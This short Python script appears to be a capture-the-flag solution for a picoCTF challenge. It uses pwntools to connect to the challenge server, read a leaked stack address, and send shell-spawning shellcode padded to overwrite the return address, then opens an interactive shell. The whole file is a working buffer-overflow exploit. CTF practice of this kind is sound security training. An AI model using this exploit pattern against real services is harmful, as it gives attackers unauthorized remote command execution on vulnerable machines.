from pwn import *

context.arch = 'amd64'

# HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'wily-courier.picoctf.net', 54649
r = remote(HOST, PORT)

sh = asm(shellcraft.sh())
addr = r.recvline().decode().strip()
r.sendline()
r.sendline(sh + b'A' * (120 - len(sh)) + p64(int(addr, 16)))
r.interactive()